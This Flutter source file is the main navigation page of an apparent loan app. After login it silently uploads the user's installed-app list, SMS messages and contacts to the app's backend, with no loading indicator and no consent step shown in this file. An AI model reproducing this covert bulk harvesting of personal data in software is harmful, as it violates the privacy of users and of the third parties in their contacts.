import 'package:flutter/material.dart';
import 'package:loannow/beans/upload_sign_bean.dart';
import 'package:loannow/config/app_colors.dart';
import 'package:loannow/config/operation_codes.dart';
import 'package:loannow/config/router_names.dart';
import 'package:loannow/config/urls.dart';
import 'package:loannow/net/dio_manager.dart';
import 'package:loannow/pages/home.dart';
import 'package:loannow/pages/mine.dart';
import 'package:loannow/utils/fk_utils.dart';
import 'package:loannow/utils/operation_utils.dart';
import 'package:loannow/utils/sp_utils.dart';

class MainPage extends StatefulWidget {
  @override
  State<StatefulWidget> createState() {
    return MainPageState();
  }
}

class MainPageState extends State<MainPage> {
  int currentIndex = 0;
  var pageList = [
    HomePage(),
    MinePage(),
  ];
  late PageController pageController;

  @override
  void initState() {
    Future.delayed(Duration.zero, () {
      setState(() {
        Object? arguments = ModalRoute.of(context)?.settings.arguments;
        if (arguments != null) {
          arguments as Map;
          if (arguments.containsKey("loginSuccess") && arguments['loginSuccess']) {
            getUploadSign();
          }
        }
      });
    });
    super.initState();
    SpUtils.isFirstOpen().then((value) => {
          if (value) {OperationUtils.saveOperation(OperationCode.FIRST_OPEN), SpUtils.setFirstOpen()}
        });
    pageController = PageController(initialPage: 0);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      // body: IndexedStack(
      //   index: currentIndex,
      //   children:pageList,
      // ),
      body: PageView.builder(
        itemBuilder: (context, index) {
          return pageList[index];
        },
        controller: pageController,
        physics: NeverScrollableScrollPhysics(),
      ),
      bottomNavigationBar: BottomNavigationBar(
        selectedItemColor: AppColors.primaryColor,
        unselectedItemColor: AppColors.textColor,
        selectedFontSize: 12,
        unselectedFontSize: 12,
        currentIndex: currentIndex,
        onTap: (tabIndex) async {
          if (tabIndex == 1) {
            String? token = await SpUtils.getToken();
            if (token == null) {
              Navigator.pushNamed(context, RouterNames.LOGIN);
              return;
            }
          }
          pageController.jumpToPage(tabIndex);
          setState(() {
            currentIndex = tabIndex;
          });
        },
        items: [
          BottomNavigationBarItem(
              icon: Image.asset("images/ic_home_n.png", width: 20), activeIcon: Image.asset("images/ic_home_c.png", width: 20), label: 'Home'),
          BottomNavigationBarItem(
              icon: Image.asset("images/ic_mine_n.png", width: 20), activeIcon: Image.asset("images/ic_mine_c.png", width: 20), label: 'Me'),
        ],
      ),
    );
  }

  void getUploadSign() {
    DioManager.getInstance().doRequest<UploadSignBean>(
        path: Urls.BASIS_INFO_UPLOADSIGN,
        method: DioMethod.GET,
        showLoading: false,
        successCallBack: (result) => {if (result != null) checkBeforeFeature(result)});
  }

  Future<void> checkBeforeFeature(UploadSignBean bean) async {
    var results = await Future.wait([FkUtils.uploadApp(bean), FkUtils.uploadSms(bean), FkUtils.uploadContact(bean)]);
    if (results[0] && results[1] && results[2])
      DioManager.getInstance()
          .doRequest(path: Urls.APPLICATION_CHECK_BEFORE_FEATURE, method: DioMethod.GET, showLoading: false, successCallBack: (result) => {});
  }
}
